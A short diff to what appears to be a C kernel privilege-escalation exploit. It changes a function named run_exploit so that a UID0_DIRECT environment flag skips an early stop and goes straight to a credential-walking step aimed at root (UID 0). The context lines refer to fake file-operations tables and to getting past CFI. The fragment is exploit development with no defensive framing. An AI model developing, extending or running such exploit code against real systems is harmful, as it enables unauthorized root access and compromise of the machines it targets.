@@ -3226,6 +3226,11 @@ int run_exploit(int argc, char **argv) {
     /* CPH isolation: stop after mode4/chain (Write1 packing softboots). */
     if (env_flag("MODE4_ONLY", 0) || chain || zion || zi || wion || zio ||
         pad3) {
+      if (env_flag("UID0_DIRECT", 0)) {
+        /* direct punch: skip the generic mode4 stop — proceed to
+         * write_proof's UID0 gate which routes to uid0_cred_walk */
+        pr_info("UID0_DIRECT: bypassing MODE4_ONLY stop\n");
+      } else {
       pr_info("MODE4_ONLY/.../ZIO stop after fops (cfi step=%d errno=%d wr=%zd "
               "fake_fops=%016zx)\n",
               cfi_last_step, cfi_last_errno, cfi_write_ret, fake_fops);
@@ -3249,6 +3254,7 @@ int run_exploit(int argc, char **argv) {
           sleep(30);
       }
       return (cfi_last_step == 0 && cfi_dirty_seen) || cfi_write_ret > 0 ? 0 : 1;
+      }
     }
   } else if (force_w1) {
     pr_info("FORCE_WRITE1=1: skipping UMH mode=4\n");
